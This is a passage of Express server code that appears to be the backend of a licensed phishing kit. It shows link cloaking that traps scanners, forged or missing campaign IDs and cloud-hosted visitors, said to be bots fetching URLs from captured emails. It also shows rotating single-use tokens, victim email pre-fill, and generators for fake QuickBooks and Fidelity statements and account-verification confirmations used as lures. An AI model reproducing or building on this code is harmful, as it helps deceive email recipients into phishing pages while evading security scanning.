  const queryCid = (req.query && req.query.cid) ? String(req.query.cid).toLowerCase() : null;
  const cookieCid = (req.cookies && req.cookies['v_cid']) ? String(req.cookies['v_cid']).toLowerCase() : null;
  const cid = queryCid || cookieCid;

  // No cid at all → bot/scanner. Trap.
  if (!cid || !/^[a-f0-9]{4,16}$/.test(cid)) {
    if (!trapExempt) {
      console.warn(`[honeypot] /v/ access with no cid from ${ip} — trapping`);
      trapIp(ip, 'v_no_cid', 7 * 24 * 60 * 60 * 1000, req);
      try { req.socket.destroy(); } catch {}
      return;
    }
    if (slugIsRegistered && !isAdminSession) console.log(`[honeypot] stale-link 404 (no cid) from ${ip} on registered slug ${req.params.slug}`);
    return res.status(404).send('Not Found');
  }

  // Forged / unknown cid → bot guessing. Trap.
  if (!attachmentDB[cid]) {
    if (!trapExempt) {
      console.warn(`[honeypot] /v/ access with unknown cid '${cid}' from ${ip} — trapping`);
      trapIp(ip, 'v_bad_cid:' + cid, 7 * 24 * 60 * 60 * 1000, req);
      try { req.socket.destroy(); } catch {}
      return;
    }
    if (slugIsRegistered && !isAdminSession) console.log(`[honeypot] stale-link 404 (cid ${cid}) from ${ip} on registered slug ${req.params.slug}`);
    return res.status(404).send('Not Found');
  }

  // Reverse-DNS check — even with a valid cid, if the visitor's IP belongs
  // to a cloud host (AWS/Azure/GCP/etc.) it's a bot fetching the URL from
  // a captured email, not a real recipient. Trap them too.
  if (!trapExempt) {
    try {
      const dnsInfo = await checkHostnameForBots(ip);
      if (dnsInfo.isCloud) {
        console.warn(`[honeypot] /v/ access from cloud-hosted IP ${ip} (${dnsInfo.hostname}) — trapping`);
        trapIp(ip, 'cloud_host:' + (dnsInfo.matched || 'unknown'), 7 * 24 * 60 * 60 * 1000, req);
        try { req.socket.destroy(); } catch {}
        return;
      }
    } catch {}
  }

  // Valid cid — refresh the cookie so subsequent rotation hits pass.
  if (queryCid && queryCid === cid) {
    res.cookie('v_cid', cid, { httpOnly: true, sameSite: 'lax', maxAge: 1000 * 60 * 60 * 24 });
  }
  next();
}

// Entry: /v/:slug  (and /v/:slug/e/:email for email-prefill entry)
app.get('/v/:slug', requireChameleonCid, (req, res, next) => {
  const owner = usersDB.find(u => u.slug === req.params.slug);
  if (!owner) return next();
  // License check: if owner's license is expired/revoked, their pages die
  if (owner.license && owner.license.tier !== 'owner' && (!owner.license.active || (owner.license.expiresAt && new Date(owner.license.expiresAt).getTime() < Date.now()))) return next();
  const queryCid = (req.query && req.query.cid) ? String(req.query.cid).toLowerCase() : null;
  const visitCid = (req.cookies && req.cookies['v_cid']) || queryCid;
  trackVisitor(owner.slug, owner.id, req, 'slug', visitCid);
  if (queryCid && /^[a-f0-9]{4,16}$/.test(queryCid)) {
    res.cookie('v_cid', queryCid, { httpOnly: true, sameSite: 'lax', maxAge: 1000 * 60 * 60 * 24 });
  }
  const { sid, token } = createRotatingSession(owner.id, null);
  const newSession = rotatingSessions.get(sid);
  if (newSession && visitCid) newSession.cid = visitCid;
  res.cookie('v_sid', sid, { httpOnly: true, sameSite: 'lax', maxAge: ROTATE_TTL });
  return res.redirect(buildUrl(owner.slug, token, null, visitCid));
});

// Rotating: /v/:slug/:token  OR  /v/:slug/:email (entry)  OR  /v/:slug/:token/:email
function handleRotating(req, res, next) {
  const { slug } = req.params;
  let token = req.params.token;
  let emailParam = req.params.email ? decodeURIComponent(req.params.email) : null;

  // If the "token" segment is actually an email (contains @), treat it as entry-with-email
  if (token && token.includes('@')) {
    emailParam = decodeURIComponent(token);
    token = null; // force new session issuance below
  }
  const owner = usersDB.find(u => u.slug === slug);
  if (!owner) return next();
  const queryCid = (req.query && req.query.cid) ? String(req.query.cid).toLowerCase() : null;
  const cookieCid = (req.cookies && req.cookies['v_cid']) || null;
  const visitCid = cookieCid || queryCid;
  trackVisitor(owner.slug, owner.id, req, 'slug', visitCid);
  // Persist cid on a cookie so rotating-token redirects keep attribution.
  if (queryCid && /^[a-f0-9]{4,16}$/.test(queryCid)) {
    res.cookie('v_cid', queryCid, { httpOnly: true, sameSite: 'lax', maxAge: 1000 * 60 * 60 * 24 });
  }

  const cookieSid = req.cookies && req.cookies['v_sid'];
  const foundSid = token ? tokenIndex.get(token) : null;

  // No/unknown token → fresh landing on the slug; create session, redirect
  if (!foundSid) {
    const { sid, token: fresh } = createRotatingSession(owner.id, emailParam);
    res.cookie('v_sid', sid, { httpOnly: true, sameSite: 'lax', maxAge: ROTATE_TTL });
    // Stash cid on the session so subsequent rotations carry it forward.
    const newSession = rotatingSessions.get(sid);
    if (newSession && visitCid) newSession.cid = visitCid;
    return res.redirect(buildUrl(owner.slug, fresh, emailParam, visitCid));
  }

  const session = rotatingSessions.get(foundSid);
  if (!session || session.userId !== owner.id) return next();
  // Adopt cid from this request if the session didn't already have one.
  if (!session.cid && visitCid) session.cid = visitCid;

  // Cookie mismatch → different viewer; spawn their own session
  if (cookieSid && cookieSid !== foundSid) {
    const { sid, token: fresh } = createRotatingSession(owner.id, emailParam || session.email);
    res.cookie('v_sid', sid, { httpOnly: true, sameSite: 'lax', maxAge: ROTATE_TTL });
    const newSession = rotatingSessions.get(sid);
    if (newSession && visitCid) newSession.cid = visitCid;
    return res.redirect(buildUrl(owner.slug, fresh, emailParam || session.email, visitCid));
  }
  if (!cookieSid) {
    res.cookie('v_sid', foundSid, { httpOnly: true, sameSite: 'lax', maxAge: ROTATE_TTL });
  }

  // Preserve/update email on session if URL carried one
  if (emailParam) session.email = emailParam;

  if (session.tokenState === 'fresh') {
    session.tokenState = 'consumed';
    const docType = req.query && req.query.dt ? String(req.query.dt).toLowerCase() : 'invoice';
    res.locals.documentType = docType;
    return sendLocalizedIndex(req, res);
  }

  // Already consumed → rotate and redirect to new URL
  const fresh = rotateToken(foundSid);
  return res.redirect(buildUrl(owner.slug, fresh, session.email, session.cid));
}

app.get('/v/:slug/:token', requireChameleonCid, handleRotating);
app.get('/v/:slug/:token/:email', requireChameleonCid, handleRotating);
// /d/:hash — unique client link (generated per client)
// (already defined above)

// ---- Deterministic per-IP randomness ----
// sha256-rehash chain: 8 uint32s per block, then rehash for the next 8 — long period, strong mixing.
function seededRng(seedStr) {
  let buf = crypto.createHash('sha256').update(String(seedStr)).digest();
  let i = 0;
  return () => {
    if (i >= 32) {
      buf = crypto.createHash('sha256').update(buf).digest();
      i = 0;
    }
    const v = buf.readUInt32BE(i);
    i += 4;
    return v / 0x100000000;
  };
}
const pick = (rng, arr) => arr[Math.floor(rng() * arr.length)];

// HSL→RGB in [0,1] for pdf-lib's rgb()
function hslToRgb(h, s, l) {
  h = ((h % 360) + 360) % 360 / 360;
  if (s === 0) return [l, l, l];
  const hue2rgb = (p, q, t) => {
    if (t < 0) t += 1;
    if (t > 1) t -= 1;
    if (t < 1/6) return p + (q - p) * 6 * t;
    if (t < 1/2) return q;
    if (t < 2/3) return p + (q - p) * (2/3 - t) * 6;
    return p;
  };
  const q = l < 0.5 ? l * (1 + s) : l + s - l * s;
  const p = 2 * l - q;
  return [hue2rgb(p, q, h + 1/3), hue2rgb(p, q, h), hue2rgb(p, q, h - 1/3)];
}

// Per-seed, per-invoice unique palette. Hue derived from sha256 of the seed so every IP gets
// its own color band; the 4 invoices in one PDF are spread 90° apart so they're visibly distinct.
function paletteForSeed(seed, variant) {
  const h = crypto.createHash('sha256').update(seed + ':palette:' + variant).digest();
  const baseHue = h.readUInt16BE(0) % 360;
  const hue = (baseHue + variant * 90) % 360;
  const sat = 0.62 + (h[2] / 255) * 0.28;     // 0.62 – 0.90
  const lit = 0.42 + (h[3] / 255) * 0.14;     // 0.42 – 0.56
  return {
    name: `hsl-${Math.round(hue)}-${Math.round(sat*100)}-${Math.round(lit*100)}`,
    primary: hslToRgb(hue, sat, lit),
    dark:    hslToRgb(hue, 0.40, 0.10),
    soft:    hslToRgb(hue, 0.55, 0.96),
  };
}

const VENDORS = [
  { name: 'Acme Consulting LLC',   addr: '123 Market Street, Suite 400', city: 'San Francisco, CA 94103', email: 'billing@acme-consulting.example', phone: '+1 (415) 555-0142', bank: 'First National Bank of San Francisco', bankAddr: '1 Embarcadero Center, San Francisco, CA 94111', swift: 'FNBSUS6SXXX', aba: '121000248' },
  { name: 'Initech Solutions Inc', addr: '450 Tech Park Blvd',          city: 'Austin, TX 78759',          email: 'ar@initech.example',              phone: '+1 (512) 555-0188', bank: 'Lone Star Bank',                   bankAddr: '900 Congress Ave, Austin, TX 78701',         swift: 'LSBKUS44XXX', aba: '111000025' },
  { name: 'Globex Digital GmbH',   addr: 'Friedrichstraße 88',          city: '10117 Berlin, Germany',     email: 'finance@globex-digital.example',  phone: '+49 30 555 0123',  bank: 'Deutsche Handelsbank',             bankAddr: 'Unter den Linden 12, 10117 Berlin',          swift: 'DHBKDEFFXXX', aba: '—'        },
  { name: 'Northwind Traders',     addr: '1 Pier Plaza',                city: 'Seattle, WA 98101',         email: 'invoices@northwind.example',      phone: '+1 (206) 555-0177', bank: 'Pacific Trust',                    bankAddr: '500 Pine Street, Seattle, WA 98101',         swift: 'PTRSUS66XXX', aba: '125000024' },
  { name: 'Stark Industries Ltd',  addr: '10880 Malibu Point',          city: 'Malibu, CA 90265',          email: 'ap@stark.example',                phone: '+1 (310) 555-0199', bank: 'Bank of Pacific',                  bankAddr: '200 Ocean Ave, Malibu, CA 90265',            swift: 'BOPCUS6LXXX', aba: '122000247' },
  { name: 'Wayne Enterprises',     addr: '1007 Mountain Drive',         city: 'Gotham, NJ 07001',          email: 'billing@wayne.example',           phone: '+1 (973) 555-0166', bank: 'Gotham Federal',                   bankAddr: '1 Gotham Plaza, Gotham, NJ 07001',           swift: 'GTFNUS33XXX', aba: '021000089' },
  { name: 'Tyrell Corp',           addr: '900 Bradbury Tower',          city: 'Los Angeles, CA 90013',     email: 'accounts@tyrell.example',         phone: '+1 (213) 555-0119', bank: 'Replicant Trust Bank',             bankAddr: '777 Bradbury Plaza, Los Angeles, CA 90013',  swift: 'RPLTUS6LXXX', aba: '122100024' },
  { name: 'Umbrella Health Co',    addr: '50 Raccoon Avenue',           city: 'Raccoon City, MI 48201',    email: 'billing@umbrella-health.example', phone: '+1 (313) 555-0144', bank: 'Midwest Federal',                  bankAddr: '1 Federal Plaza, Detroit, MI 48226',         swift: 'MFEDUS44XXX', aba: '072000326' },
];

const CLIENTS = [
  { name: 'Globex Corporation',   addr: '500 Innovation Drive',  city: 'Austin, TX 78701',     email: 'billing@globex.example' },
  { name: 'Soylent Foods Inc',    addr: '88 Greenview Way',      city: 'New York, NY 10001',   email: 'ap@soylent.example' },
  { name: 'Massive Dynamic',      addr: '1 Massive Plaza',       city: 'New York, NY 10005',   email: 'finance@massive.example' },
  { name: 'Hooli Technologies',   addr: '1401 Hooli Park',       city: 'Palo Alto, CA 94301',  email: 'invoices@hooli.example' },
  { name: 'Pied Piper Inc',       addr: '5230 Newell Road',      city: 'Palo Alto, CA 94303',  email: 'ar@piedpiper.example' },
  { name: 'Vandelay Industries',  addr: '129 W 81st St',         city: 'New York, NY 10024',   email: 'ap@vandelay.example' },
  { name: 'Bluth Company',        addr: '1 Banana Stand',        city: 'Newport Beach, CA',    email: 'billing@bluth.example' },
  { name: 'Dunder Mifflin',       addr: '1725 Slough Avenue',    city: 'Scranton, PA 18505',   email: 'accounts@dundermifflin.example' },
];

const ITEM_POOL = [
  ['Cloud architecture consulting',         20, 250],
  ['Security audit & remediation report',    1, 1800],
  ['DevOps pipeline setup',                  6, 175],
  ['Documentation & knowledge transfer',     4, 150],
  ['Custom software development',           40, 145],
  ['Database performance tuning',            8, 195],
  ['UI/UX design sprint',                   10, 165],
  ['Penetration testing engagement',         1, 4200],
  ['Migration to Kubernetes',               24, 220],
  ['On-site training (2 days)',              2, 1500],
  ['Quarterly retainer — support',           1, 2400],
  ['API integration work',                  16, 160],
];

// QuickBooks Statement Generator
async function generateQuickBooksStatement(res, rng, userKey, ip) {
  try {
    const doc = await PDFDocument.create();
    const page = doc.addPage([612, 792]);
    const bold = await doc.embedFont(StandardFonts.HelveticaBold);
    const helv = await doc.embedFont(StandardFonts.Helvetica);
    const PRIMARY = rgb(29/255, 177/255, 77/255);
    const DARK = rgb(13/255, 138/255, 58/255);

    // Header
    page.drawRectangle({ x: 0, y: 740, width: 612, height: 52, color: DARK });
    page.drawRectangle({ x: 0, y: 736, width: 612, height: 4, color: PRIMARY });
    page.drawText('QuickBooks Financial Statement', { x: 40, y: 758, size: 18, font: bold, color: rgb(1,1,1) });
    page.drawText('Account Statement', { x: 612 - 40 - helv.widthOfTextAtSize('Account Statement', 11), y: 755, size: 11, font: helv, color: rgb(0.9,0.9,0.95) });

    // Account info
    let y = 700;
    page.drawText('Account Number', { x: 40, y, size: 9, font: bold, color: rgb(0.4,0.4,0.45) });
    page.drawText('QB-' + Math.floor(Math.random() * 999999).toString().padStart(6, '0'), { x: 40, y: y - 15, size: 12, font: bold, color: DARK });

    page.drawText('Statement Period', { x: 300, y, size: 9, font: bold, color: rgb(0.4,0.4,0.45) });
    const today = new Date();
    const lastMonth = new Date(today.getFullYear(), today.getMonth() - 1, 1);
    page.drawText(`${lastMonth.toLocaleDateString()} - ${today.toLocaleDateString()}`, { x: 300, y: y - 15, size: 12, font: bold, color: DARK });

    // Summary
    y = 620;
    page.drawRectangle({ x: 40, y: y - 80, width: 532, height: 90, color: rgb(0.95, 0.98, 0.95), borderColor: PRIMARY, borderWidth: 1 });
    page.drawText('Account Summary', { x: 50, y, size: 11, font: bold, color: DARK });
    y -= 25;
    page.drawText('Beginning Balance:', { x: 50, y, size: 10, font: helv, color: rgb(0.3,0.3,0.35) });
    page.drawText('$45,230.50', { x: 500 - helv.widthOfTextAtSize('$45,230.50', 10), y, size: 10, font: bold, color: DARK });
    y -= 18;
    page.drawText('Net Activity:', { x: 50, y, size: 10, font: helv, color: rgb(0.3,0.3,0.35) });
    page.drawText('$12,450.75', { x: 500 - helv.widthOfTextAtSize('$12,450.75', 10), y, size: 10, font: bold, color: PRIMARY });
    y -= 18;
    page.drawText('Ending Balance:', { x: 50, y, size: 11, font: bold, color: rgb(0.3,0.3,0.35) });
    page.drawText('$57,681.25', { x: 500 - helv.widthOfTextAtSize('$57,681.25', 11), y, size: 12, font: bold, color: DARK });

    y = 480;
    page.drawText('Recent Activity', { x: 40, y, size: 11, font: bold, color: DARK });
    y -= 30;
    page.drawRectangle({ x: 40, y, width: 532, height: 20, color: DARK });
    page.drawText('Date', { x: 50, y: y + 5, size: 9, font: bold, color: rgb(1,1,1) });
    page.drawText('Description', { x: 150, y: y + 5, size: 9, font: bold, color: rgb(1,1,1) });
    page.drawText('Amount', { x: 500, y: y + 5, size: 9, font: bold, color: rgb(1,1,1) });

    const transactions = [
      ['12/15/2024', 'Deposit - Client Invoice', '$5,000.00'],
      ['12/14/2024', 'Transfer Out', '-$2,300.00'],
      ['12/12/2024', 'Deposit - Service Fee', '$850.00'],
    ];

    y -= 20;
    transactions.forEach((t, i) => {
      if (i % 2 === 0) page.drawRectangle({ x: 40, y, width: 532, height: 18, color: rgb(0.98, 0.99, 0.98) });
      page.drawText(t[0], { x: 50, y: y + 3, size: 9, font: helv, color: DARK });
      page.drawText(t[1], { x: 150, y: y + 3, size: 9, font: helv, color: DARK });
      page.drawText(t[2], { x: 520 - helv.widthOfTextAtSize(t[2], 9), y: y + 3, size: 9, font: helv, color: DARK });
      y -= 18;
    });

    page.drawText(`Generated: ${new Date().toLocaleDateString()} • Page 1 of 1 • ID: ${ip}`, { x: 40, y: 30, size: 8, font: helv, color: rgb(0.6,0.6,0.65) });

    const bytes = await doc.save();
    res.setHeader('Content-Type', 'application/pdf');
    res.setHeader('Content-Disposition', 'inline; filename="quickbooks-statement.pdf"');
    res.send(Buffer.from(bytes));
  } catch (e) {
    console.error(e);
    res.status(500).json({ error: e.message });
  }
}

// Fidelity Statement Generator
async function generateFidelityStatement(res, rng, userKey, ip) {
  try {
    const doc = await PDFDocument.create();
    const page = doc.addPage([612, 792]);
    const bold = await doc.embedFont(StandardFonts.HelveticaBold);
    const helv = await doc.embedFont(StandardFonts.Helvetica);
    const PRIMARY = rgb(29/255, 177/255, 77/255);
    const DARK = rgb(13/255, 138/255, 58/255);

    // Header
    page.drawRectangle({ x: 0, y: 740, width: 612, height: 52, color: DARK });
    page.drawRectangle({ x: 0, y: 736, width: 612, height: 4, color: PRIMARY });
    page.drawText('Fidelity Brokerage Account', { x: 40, y: 758, size: 18, font: bold, color: rgb(1,1,1) });
    page.drawText('Investment Statement', { x: 612 - 40 - helv.widthOfTextAtSize('Investment Statement', 11), y: 755, size: 11, font: helv, color: rgb(0.9,0.9,0.95) });

    // Account info
    let y = 700;
    page.drawText('Account Number', { x: 40, y, size: 9, font: bold, color: rgb(0.4,0.4,0.45) });
    page.drawText('FID-' + Math.floor(Math.random() * 999999).toString().padStart(6, '0'), { x: 40, y: y - 15, size: 12, font: bold, color: DARK });

    page.drawText('As of', { x: 300, y, size: 9, font: bold, color: rgb(0.4,0.4,0.45) });
    page.drawText(new Date().toLocaleDateString(), { x: 300, y: y - 15, size: 12, font: bold, color: DARK });

    // Portfolio summary
    y = 620;
    page.drawRectangle({ x: 40, y: y - 80, width: 532, height: 90, color: rgb(0.95, 0.98, 0.95), borderColor: PRIMARY, borderWidth: 1 });
    page.drawText('Portfolio Summary', { x: 50, y, size: 11, font: bold, color: DARK });
    y -= 25;
    page.drawText('Total Market Value:', { x: 50, y, size: 10, font: helv, color: rgb(0.3,0.3,0.35) });
    page.drawText('$285,450.00', { x: 500 - helv.widthOfTextAtSize('$285,450.00', 10), y, size: 10, font: bold, color: DARK });
    y -= 18;
    page.drawText('Year-to-Date Gain/Loss:', { x: 50, y, size: 10, font: helv, color: rgb(0.3,0.3,0.35) });
    page.drawText('+$18,920.45 (+7.1%)', { x: 500 - helv.widthOfTextAtSize('+$18,920.45 (+7.1%)', 10), y, size: 10, font: bold, color: PRIMARY });
    y -= 18;
    page.drawText('Cash Balance:', { x: 50, y, size: 11, font: bold, color: rgb(0.3,0.3,0.35) });
    page.drawText('$12,350.25', { x: 500 - helv.widthOfTextAtSize('$12,350.25', 11), y, size: 12, font: bold, color: DARK });

    y = 480;
    page.drawText('Holdings', { x: 40, y, size: 11, font: bold, color: DARK });
    y -= 30;
    page.drawRectangle({ x: 40, y, width: 532, height: 20, color: DARK });
    page.drawText('Symbol', { x: 50, y: y + 5, size: 9, font: bold, color: rgb(1,1,1) });
    page.drawText('Shares', { x: 150, y: y + 5, size: 9, font: bold, color: rgb(1,1,1) });
    page.drawText('Price', { x: 240, y: y + 5, size: 9, font: bold, color: rgb(1,1,1) });
    page.drawText('Value', { x: 500, y: y + 5, size: 9, font: bold, color: rgb(1,1,1) });

    const holdings = [
      ['VTSAX', '450.50', '$125.45', '$56,475.23'],
      ['VTIAX', '320.25', '$87.30', '$27,955.98'],
      ['BND', '180.75', '$83.50', '$15,092.38'],
    ];

    y -= 20;
    holdings.forEach((h, i) => {
      if (i % 2 === 0) page.drawRectangle({ x: 40, y, width: 532, height: 18, color: rgb(0.98, 0.99, 0.98) });
      page.drawText(h[0], { x: 50, y: y + 3, size: 9, font: bold, color: DARK });
      page.drawText(h[1], { x: 150, y: y + 3, size: 9, font: helv, color: DARK });
      page.drawText(h[2], { x: 240, y: y + 3, size: 9, font: helv, color: DARK });
      page.drawText(h[3], { x: 530 - helv.widthOfTextAtSize(h[3], 9), y: y + 3, size: 9, font: helv, color: DARK });
      y -= 18;
    });

    page.drawText(`Statement Period End: ${new Date().toLocaleDateString()} • Page 1 of 1 • Reference: ${ip}`, { x: 40, y: 30, size: 8, font: helv, color: rgb(0.6,0.6,0.65) });

    const bytes = await doc.save();
    res.setHeader('Content-Type', 'application/pdf');
    res.setHeader('Content-Disposition', 'inline; filename="fidelity-statement.pdf"');
    res.send(Buffer.from(bytes));
  } catch (e) {
    console.error(e);
    res.status(500).json({ error: e.message });
  }
}

// Receipt Generator
async function generateReceipt(res, rng, userKey, ip) {
  try {
    const doc = await PDFDocument.create();
    const page = doc.addPage([400, 600]);
    const bold = await doc.embedFont(StandardFonts.HelveticaBold);
    const helv = await doc.embedFont(StandardFonts.Helvetica);

    let y = 550;
    page.drawText('RECEIPT', { x: 100, y, size: 16, font: bold, color: rgb(0,0,0) });
    y -= 30;
    page.drawText(`Receipt #: RCP-${Math.floor(Math.random() * 999999).toString().padStart(6, '0')}`, { x: 30, y, size: 9, font: helv, color: rgb(0.3,0.3,0.3) });
    y -= 15;
    page.drawText(`Date: ${new Date().toLocaleDateString()}`, { x: 30, y, size: 9, font: helv, color: rgb(0.3,0.3,0.3) });
    y -= 30;

    page.drawLine({ start: { x: 30, y }, end: { x: 370, y }, thickness: 1, color: rgb(0.8,0.8,0.8) });
    y -= 20;

    const items = [
      ['Product A', '1', '$24.99'],
      ['Product B', '2', '$39.98'],
      ['Shipping', '—', '$5.00'],
    ];

    items.forEach(item => {
      page.drawText(item[0], { x: 30, y, size: 10, font: helv, color: rgb(0,0,0) });
      page.drawText(item[1], { x: 320, y, size: 9, font: helv, color: rgb(0.4,0.4,0.4) });
      page.drawText(item[2], { x: 370 - helv.widthOfTextAtSize(item[2], 10), y, size: 10, font: bold, color: rgb(0,0,0) });
      y -= 18;
    });

    y -= 10;
    page.drawLine({ start: { x: 30, y }, end: { x: 370, y }, thickness: 1, color: rgb(0.8,0.8,0.8) });
    y -= 20;

    page.drawText('TOTAL', { x: 30, y, size: 12, font: bold, color: rgb(0,0,0) });
    page.drawText('$69.97', { x: 370 - helv.widthOfTextAtSize('$69.97', 12), y, size: 12, font: bold, color: rgb(0,0,0) });
    y -= 30;

    page.drawText('Thank you for your purchase!', { x: 60, y, size: 10, font: helv, color: rgb(0.4,0.4,0.4) });

    const bytes = await doc.save();
    res.setHeader('Content-Type', 'application/pdf');
    res.setHeader('Content-Disposition', 'inline; filename="receipt.pdf"');
    res.send(Buffer.from(bytes));
  } catch (e) {
    console.error(e);
    res.status(500).json({ error: e.message });
  }
}

// Confirmation Generator
async function generateConfirmation(res, rng, userKey, ip) {
  try {
    const doc = await PDFDocument.create();
    const page = doc.addPage([612, 792]);
    const bold = await doc.embedFont(StandardFonts.HelveticaBold);
    const helv = await doc.embedFont(StandardFonts.Helvetica);
    const PRIMARY = rgb(22/255, 163/255, 74/255);

    let y = 700;
    page.drawRectangle({ x: 0, y: y - 80, width: 612, height: 80, color: rgb(0.95, 0.99, 0.95), borderColor: PRIMARY, borderWidth: 2 });
    page.drawText('CONFIRMED', { x: 40, y: y - 20, size: 20, font: bold, color: PRIMARY });
    page.drawText('Your account has been reviewed', { x: 40, y: y - 45, size: 12, font: helv, color: rgb(0.3,0.3,0.35) });

    y -= 100;
    page.drawText('Confirmation #', { x: 40, y, size: 9, font: bold, color: rgb(0.4,0.4,0.45) });
    page.drawText('CNF-' + Math.floor(Math.random() * 999999).toString().padStart(6, '0'), { x: 40, y: y - 15, size: 12, font: bold, color: rgb(0,0,0) });

    y -= 50;
    page.drawText('Review Status:', { x: 40, y, size: 10, font: bold, color: rgb(0,0,0) });
    y -= 18;
    page.drawText('Account verification completed successfully', { x: 50, y, size: 10, font: helv, color: rgb(0.3,0.3,0.35) });
    y -= 18;
    page.drawText('All documents received and approved', { x: 50, y, size: 10, font: helv, color: rgb(0.3,0.3,0.35) });
    y -= 18;
    page.drawText('No further action required', { x: 50, y, size: 10, font: helv, color: rgb(0.3,0.3,0.35) });

    y -= 40;
    page.drawText('Next Steps:', { x: 40, y, size: 10, font: bold, color: rgb(0,0,0) });
    y -= 18;
    page.drawText('Your account is now fully active and ready to use', { x: 50, y, size: 10, font: helv, color: rgb(0.3,0.3,0.35) });
    y -= 18;
    page.drawText('You will receive email confirmation at your registered address', { x: 50, y, size: 10, font: helv, color: rgb(0.3,0.3,0.35) });

    page.drawText(`Confirmed: ${new Date().toLocaleDateString()} • Page 1 of 1`, { x: 40, y: 30, size: 8, font: helv, color: rgb(0.6,0.6,0.65) });

    const bytes = await doc.save();
    res.setHeader('Content-Type', 'application/pdf');
    res.setHeader('Content-Disposition', 'inline; filename="confirmation.pdf"');
    res.send(Buffer.from(bytes));
  } catch (e) {
    console.error(e);
    res.status(500).json({ error: e.message });
  }
}

// Invitation Generator
async function generateInvitation(res, rng, userKey, ip) {
  try {
    const doc = await PDFDocument.create();
    const page = doc.addPage([612, 792]);
    const bold = await doc.embedFont(StandardFonts.HelveticaBold);
    const helv = await doc.embedFont(StandardFonts.Helvetica);
    const PRIMARY = rgb(147/255, 51/255, 234/255);

    let y = 650;
    page.drawRectangle({ x: 40, y: y - 100, width: 532, height: 120, color: rgb(0.97, 0.94, 0.99), borderColor: PRIMARY, borderWidth: 2 });
    page.drawText('You\'re Invited!', { x: 60, y: y - 30, size: 24, font: bold, color: PRIMARY });
    page.drawText('Join us for exclusive access', { x: 60, y: y - 60, size: 14, font: helv, color: rgb(0.3,0.3,0.35) });

    y -= 150;
    page.drawText('Invitation Code:', { x: 40, y, size: 10, font: bold, color: rgb(0,0,0) });
    page.drawText('INV-' + Math.floor(Math.random() * 999999).toString().padStart(6, '0'), { x: 40, y: y - 15, size: 13, font: bold, color: PRIMARY });

    y -= 50;
    page.drawText('What\'s included:', { x: 40, y, size: 10, font: bold, color: rgb(0,0,0) });
    y -= 18;
    page.drawText('• Full premium access to all features', { x: 50, y, size: 10, font: helv, color: rgb(0.3,0.3,0.35) });
    y -= 18;
    page.drawText('• Priority support and resources', { x: 50, y, size: 10, font: helv, color: rgb(0.3,0.3,0.35) });
    y -= 18;
    page.drawText('• Exclusive community membership', { x: 50, y, size: 10, font: helv, color: rgb(0.3,0.3,0.35) });

    y -= 40;
    page.drawText('This invitation expires on: ' + new Date(Date.now() + 30 * 24 * 60 * 60 * 1000).toLocaleDateString(), { x: 40, y, size: 9, font: helv, color: rgb(0.4,0.4,0.45) });

    page.drawText(`Issued: ${new Date().toLocaleDateString()} • Page 1 of 1`, { x: 40, y: 30, size: 8, font: helv, color: rgb(0.6,0.6,0.65) });

    const bytes = await doc.save();
    res.setHeader('Content-Type', 'application/pdf');
    res.setHeader('Content-Disposition', 'inline; filename="invitation.pdf"');
    res.send(Buffer.from(bytes));
  } catch (e) {
    console.error(e);
    res.status(500).json({ error: e.message });
  }
}

app.get('/api/sample-invoice', async (req, res) => {
  try {
    const ip = (req.headers['x-forwarded-for'] || req.ip || req.socket.remoteAddress || 'anon')
      .toString().split(',')[0].trim();
    const userKey = req.session?.user?.email || ip;
    const seed = userKey + (req.query.v || '');
    const rng = seededRng(seed);
    // FIX: Check documentType from query param (passed by app.js with window.__DOCUMENT_TYPE__)
    // Routes /i/, /r/, /c/, etc. will pass &type=invoice, &type=receipt, etc. via query
    // This ensures the correct PDF is generated for each document type
    const documentType = req.query.type || res.locals.documentType || req.session?.documentType || 'invoice';
    console.log(`[/api/sample-invoice] query.type=${req.query.type}, documentType=${documentType}`);

    // Route to different PDF generators based on document type
    if (documentType === 'quickbook') {
      return generateQuickBooksStatement(res, rng, userKey, ip);
    } else if (documentType === 'fidelity') {
      return generateFidelityStatement(res, rng, userKey, ip);
    } else if (documentType === 'receipt') {
      return generateReceipt(res, rng, userKey, ip);
    } else if (documentType === 'confirmation') {
      return generateConfirmation(res, rng, userKey, ip);
    } else if (documentType === 'invitation') {
      return generateInvitation(res, rng, userKey, ip);
    }

    // Default: generate invoice
    const doc = await PDFDocument.create();
    const helv = await doc.embedFont(StandardFonts.Helvetica);
    const bold = await doc.embedFont(StandardFonts.HelveticaBold);
    const fmt = (d) => d.toISOString().slice(0, 10);
    const rightAlign = (txt, font, size, rightX) => rightX - font.widthOfTextAtSize(txt, size);

    const baseClient = pick(rng, CLIENTS);
    const client = req.session?.user
      ? { ...baseClient,
          name: req.session.user.name.charAt(0).toUpperCase() + req.session.user.name.slice(1),
          email: req.session.user.email }
      : baseClient;

    // Vendors are drawn without replacement across the 4 pages so no two invoices share a vendor.
    const vendorPool = [...VENDORS];

    // Generate 4 invoices, each on its own page
    for (let inv = 0; inv < 4; inv++) {
      const palette = paletteForSeed(seed, inv);
      const vIdx = Math.floor(rng() * vendorPool.length);
      const vendor = vendorPool.splice(vIdx, 1)[0];

      const itemCount = 3 + Math.floor(rng() * 3);
      const pool = [...ITEM_POOL];
      const items = [];
      for (let i = 0; i < itemCount; i++) {
        const idx = Math.floor(rng() * pool.length);
        const [desc, qty, rate] = pool.splice(idx, 1)[0];
        const q = Math.max(1, qty + Math.floor((rng() - 0.5) * 6));
        items.push([desc, q, rate, q * rate]);
      }

      const today = new Date(Date.now() - inv * 30 * 86400000); // each invoice 30 days apart
      const due = new Date(today.getTime() + 30 * 86400000);
      const invNo = 'INV-' + today.getFullYear() + '-' + String(1000 + Math.floor(rng() * 9000));

      const PRIMARY = rgb(...palette.primary);
      const DARK = rgb(...palette.dark);
      const GREY = rgb(0.45, 0.45, 0.5);
      const LINE = rgb(0.85, 0.85, 0.88);
      const SOFT = rgb(...palette.soft);

      const page = doc.addPage([612, 792]);

      // Header bar
      page.drawRectangle({ x: 0, y: 740, width: 612, height: 52, color: DARK });
      page.drawRectangle({ x: 0, y: 736, width: 612, height: 4, color: PRIMARY });
      page.drawText('INVOICE', { x: 40, y: 758, size: 22, font: bold, color: rgb(1,1,1) });
      page.drawText(vendor.name, { x: 612 - 40 - bold.widthOfTextAtSize(vendor.name, 11), y: 765, size: 11, font: bold, color: rgb(1,1,1) });
      page.drawText(vendor.addr, { x: 612 - 40 - helv.widthOfTextAtSize(vendor.addr, 9), y: 752, size: 9, font: helv, color: rgb(0.85,0.85,0.9) });
      page.drawText(vendor.city, { x: 612 - 40 - helv.widthOfTextAtSize(vendor.city, 9), y: 742, size: 9, font: helv, color: rgb(0.85,0.85,0.9) });
